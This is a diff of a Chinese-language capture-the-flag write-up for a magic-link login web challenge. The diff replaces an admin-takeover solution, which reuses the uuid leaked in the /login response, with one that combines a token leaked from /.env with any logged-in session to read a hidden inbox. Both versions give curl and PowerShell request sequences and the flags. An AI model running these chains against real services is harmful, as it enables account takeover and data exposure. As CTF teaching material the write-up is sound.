@@ -5,29 +5,11 @@
 - 类型：Web
 - 题目状态：已解出
 - 目标：https://bluehens-magic-link.chals.io/
-- 核心漏洞：Magic link 的一次性 `uuid` 直接在 `/login` 响应里返回，随后可通过 `/login/<uuid>` 直接换取登录态
+- 核心漏洞：`/.env` 泄露的 Teddy token 可以配合任意已登录 session 访问 `/inbox`，从而读到 Teddy 收件箱里的第二层 flag
 
 ## 入口与现象
 
-2026-04-18 实测首页依然是一个极简的 Magic Link 登录页，前端会把邮箱提交到 `/login`：
-
-```html
-<form id="magic-link-form">
-  <input type="email" name="email" placeholder="Enter Email" required>
-  <button type="submit">Send Magic Link</button>
-</form>
-```
-
-先做基础枚举，`robots.txt` 里给了几个隐藏路径：
-
-```text
-User-agent: *
-Disallow: /inbox
-Disallow: /dashboard
-Disallow: /.env
-```
-
-继续访问 `/.env`，可以看到：
+第一层已经能从 `/.env` 读到：
 
 ```text
 TEDDYS_EMAIL=teddy@udctf.com
@@ -36,123 +18,115 @@ ADMIN_EMAIL=admin@udctf.com
 INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
 ```
 
-这里的 `TEDDYS_TOKEN` 正好是第一层的 flag，但不是这题的最终答案。真正需要注意的是：
+这里最关键的不是第一层 flag 本身，而是后两项信息：
 
-- 站点里确实存在 `admin@udctf.com`
-- 题目强调的是 Magic Link 登录
-- 所以应该继续看 magic link 本身有没有实现缺陷
+- Teddy 的 inbox 需要一个 `token`
+- 管理员邮箱和 Teddy 的内部收件箱是题目后续流程的一部分
+
+再看 `robots.txt`：
+
+```text
+User-agent: *
+Disallow: /inbox
+Disallow: /dashboard
+Disallow: /.env
+```
+
+`/inbox` 明确被藏起来了，说明它就是下一层重点。
 
 ## 分析过程
 
-### 1. 先观察 `/login` 的真实返回
+### 1. `token` 单独访问 `/inbox` 不够
 
-向 `/login` 提交管理员邮箱：
-
-```http
-POST /login HTTP/1.1
-Host: bluehens-magic-link.chals.io
-Content-Type: multipart/form-data
-
-email=admin@udctf.com
-```
-
-返回 JSON：
-
-```json
-{
-  "datetime": "2026-04-18T09:53:46.970346+00:00",
-  "email": "admin@udctf.com",
-  "ip-address": "10.1.0.20",
-  "message": "Magic link generated, check your email.",
-  "uuid": "NHfaAN3pn9mvsXjAfR138g"
-}
-```
-
-这里最关键的问题是：后端把 magic link 对应的一次性 `uuid` 直接返回给前端了。
-
-正常设计里，这种 token 应该只出现在邮件里，不应该直接暴露给请求者。既然已经拿到了 `uuid`，那下一步就应该试它是不是可以直接当登录链接使用。
-
-### 2. 发现真正的 magic link 入口是 `/login/<uuid>`
-
-访问：
+直接访问：
 
 ```http
-GET /login/NHfaAN3pn9mvsXjAfR138g HTTP/1.1
+GET /inbox?token=udctf{d0n7_h057_y0ur_3nv_f113} HTTP/1.1
 Host: bluehens-magic-link.chals.io
 ```
 
-服务端返回重定向，并设置了 session：
+返回：
 
 ```http
-HTTP/1.1 302 FOUND
-Location: /dashboard
-Set-Cookie: session=...; HttpOnly; Path=/
+HTTP/1.1 403 FORBIDDEN
 ```
 
-我在 2026-04-18 的一次顺序复现实测中，服务端明确给管理员下发了登录态：
+说明 `/inbox` 不是单纯拿 token 就能看，还额外要求调用者处于某种已认证状态。
 
-```text
-Set-Cookie: session=eyJ1c2VyIjoiYWRtaW5AdWRjdGYuY29tIn0....
-```
+### 2. 先拿一个普通登录态
 
-把这个 session 带去访问 `/dashboard`：
+继续测试发现，`/login` 不只会给管理员或 Teddy 生成 magic link，任意邮箱都能收到返回的 `uuid`。随后访问 `/login/<uuid>` 就能得到一个已登录 session。
+
+这意味着第二层并不要求先拿管理员权限，只要先换到任意登录态，再带着第一层泄露的 token 去打 `/inbox` 即可。
+
+### 3. 带 session 和 Teddy token 打开收件箱
+
+我在 2026-04-18 的实测中，用一个随机邮箱换到 session 后，再访问：
 
 ```http
-GET /dashboard HTTP/1.1
+GET /inbox?token=udctf{d0n7_h057_y0ur_3nv_f113} HTTP/1.1
 Host: bluehens-magic-link.chals.io
 Cookie: session=...
 ```
 
-返回内容：
+服务端会返回 Teddy 的 inbox 页面：
 
 ```html
-<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
+<h2>Teddy's Inbox (Refreshes every 5s)</h2>
+```
+
+这个页面非常长，夹杂大量空白节点，直接肉眼看很不方便。把返回内容保存下来再搜 `udctf{`，就能在靠后的位置找到第二层 flag：
+
+```html
+<li><a href="/login/m8hxfWL6vuzPl3fOm-Ywjw">Click here to login</a></li>
+<p>udctf{m4g1c_l1nks_4r3_w31rd}</p>
 ```
 
 到这里第二层 flag 就出来了。
 
 ## 利用过程
 
-1. 查看 `robots.txt`，发现 `/.env`、`/inbox`、`/dashboard`。
-2. 读取 `/.env`，确认题目里存在 `admin@udctf.com`，并注意到前面的 `TEDDYS_TOKEN` 只是第一层 flag。
-3. 向 `/login` 提交 `admin@udctf.com`，拿到响应中的 `uuid`。
-4. 直接访问 `/login/<uuid>`，服务端会设置管理员 session 并跳转到 `/dashboard`。
-5. 带着该 session 访问 `/dashboard`，读取最终 flag。
+1. 通过 `/.env` 拿到 Teddy 的 token，也就是 `udctf{d0n7_h057_y0ur_3nv_f113}`。
+2. 向 `/login` 提交任意邮箱，读取响应中的 `uuid`。
+3. 访问 `/login/<uuid>`，换到一个已登录 session。
+4. 带着这个 session 访问 `/inbox?token=TEDDYS_TOKEN`。
+5. 保存 inbox HTML 并搜索 `udctf{`，读出第二层 flag。
 
 ## 关键 payload / 命令
 
-```bash
-curl -i https://bluehens-magic-link.chals.io/robots.txt
-curl -i https://bluehens-magic-link.chals.io/.env
-curl -i -X POST -F "email=admin@udctf.com" https://bluehens-magic-link.chals.io/login
-curl -i https://bluehens-magic-link.chals.io/login/<uuid>
-curl -i -b "session=<cookie>" https://bluehens-magic-link.chals.io/dashboard
-```
-
-为了稳定复现，我最后使用了同一个会话顺序完成整个链条：
-
 ```powershell
+$mail = 'foo@example.com'
 $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = 'admin@udctf.com' }
+$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = $mail }
 $uuid = $login.uuid
-Invoke-WebRequest -Uri ("https://bluehens-magic-link.chals.io/login/" + $uuid) -WebSession $s
-Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/dashboard' -WebSession $s
+try {
+    Invoke-WebRequest -Uri ("https://bluehens-magic-link.chals.io/login/" + $uuid) -WebSession $s -MaximumRedirection 0 -ErrorAction Stop | Out-Null
+} catch {
+    if ($_.Exception.Response.StatusCode.value__ -notin 301,302,303,307,308) { throw }
+}
+$inbox = Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/inbox?token=udctf{d0n7_h057_y0ur_3nv_f113}' -WebSession $s
+$inbox.Content | Set-Content .\inbox.html
 ```
 
-关键输出：
+然后本地搜索：
 
-```text
-ADMIN_UUID=X0_5VEkDD9E6njtVNrhYCQ
-200
-<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
+```bash
+rg -n "udctf\\{|/login/" inbox.html
+```
+
+关键命中：
+
+```html
+<li><a href="/login/m8hxfWL6vuzPl3fOm-Ywjw">Click here to login</a></li>
+<p>udctf{m4g1c_l1nks_4r3_w31rd}</p>
 ```
 
 ## Flag
 
 ```text
-udctf{y0u_4r3_m4g1c_l1nk_m4st3r}
+udctf{m4g1c_l1nks_4r3_w31rd}
 ```
 
 ## 总结
 
-这题表面上先用 `/.env` 给了一个很像终点的第一层 flag，但真正的漏洞在 magic link 的实现本身。后端把登录用的一次性 `uuid` 直接回给前端，等于把邮件里的敏感链接主动泄露给了攻击者。只要知道管理员邮箱，就可以自己申请 magic link、自己消费 `/login/<uuid>`、再直接进入管理员面板拿到最终 flag。
+第二层的核心问题是鉴权拼接错了。开发者本来想用 Teddy 的 token 保护内部 inbox，但实际检查变成了“泄露的 token + 任意已登录 session”就能通过。结果是攻击者只要先拿第一层的 `.env` 泄露，再随便给自己换一个 magic link 登录态，就能读到 Teddy 收件箱里的第二层 flag。
